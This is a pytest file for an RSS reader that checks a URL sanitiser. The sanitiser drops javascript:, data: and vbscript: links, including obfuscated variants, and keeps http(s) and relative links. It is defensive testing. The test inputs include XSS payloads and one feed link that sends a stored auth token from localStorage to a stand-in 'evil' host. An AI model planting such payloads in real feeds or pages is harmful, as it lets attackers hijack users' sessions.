"""Feed-supplied links are rendered as clickable "Open original" links, also on
public share pages, so only http(s) or relative URLs may be stored."""

import pytest

from app.adapters.base import ParsedEntry, ParsedFeedMeta, web_url_or_none
from app.adapters.rss import RSSAdapter


@pytest.mark.parametrize(
    "url",
    [
        "javascript:alert(document.domain)",
        "JavaScript:alert(1)",
        "  javascript:alert(1)",
        "java\tscript:alert(1)",
        "\x01javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
    ],
)
def test_script_schemes_are_dropped(url):
    assert web_url_or_none(url) is None
    assert ParsedEntry(guid="g", url=url).url is None
    assert ParsedFeedMeta(site_url=url).site_url is None


@pytest.mark.parametrize("url", ["https://example.com/a?b=1", "http://example.com/", "/posts/1", "posts/1", None])
def test_web_and_relative_urls_are_kept(url):
    assert web_url_or_none(url) == url
    assert ParsedEntry(guid="g", url=url).url == url


def test_rss_link_with_javascript_scheme_is_not_stored():
    feed = """<?xml version="1.0"?><rss version="2.0"><channel><title>t</title>
    <link>javascript:alert(1)</link>
    <item><title>x</title><guid>1</guid><link>javascript:fetch('//evil/?'+localStorage['intelfeed-auth'])</link></item>
    </channel></rss>"""
    meta, entries = RSSAdapter().parse_entries("https://feed.example/rss", feed)
    assert entries and entries[0].url is None
    assert meta.site_url is None
